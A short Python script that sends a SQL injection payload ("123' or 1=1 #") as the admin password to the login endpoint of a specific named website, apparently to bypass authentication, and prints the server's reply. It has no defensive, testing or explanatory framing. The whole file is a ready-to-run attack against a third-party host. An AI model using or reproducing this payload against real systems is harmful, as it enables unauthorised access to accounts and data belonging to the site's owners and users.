'''
__target__ = 登陆 tdqs
'''
import requests,json,sys


def main():
    host = 'https://www.iotqsgf.com/'
    data = {
        'username':"admin",
        'password':"123' or 1=1 #"
    }
    ret = requests.post(host+'login',data=json.dumps(data))
    print(ret.text)

if __name__ == "__main__":
    main()